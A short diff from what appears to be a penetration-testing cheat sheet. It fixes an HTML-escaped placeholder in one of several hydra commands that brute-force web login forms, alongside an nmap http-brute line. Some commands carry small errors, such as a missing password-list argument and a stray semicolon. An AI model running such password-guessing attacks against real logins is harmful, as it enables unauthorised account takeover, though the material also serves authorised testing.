@@ -149,7 +149,7 @@ nmap -p 80 --script http-brute --script-args 'http-brute.hostname=domain_name,ht
 ```text
 hydra -l username -P <IP> http-post-form "/login_file.php:username_parameter=^USER^&password_parameter=^PASS^:error message"
 
-hydra -l username; -P passlist.txt &lt;IP&gt; https-post-form "/directory/filname.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
+hydra -l username; -P passlist.txt <IP> https-post-form "/directory/filname.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
 
 hydra -l admin -P /opt/SecLists/Passwords/10k_most_common.txt <IP> http-post-form "/dir/filename.php:username=^USER^&password=^PASS^:Invalid" -t 64
 ```
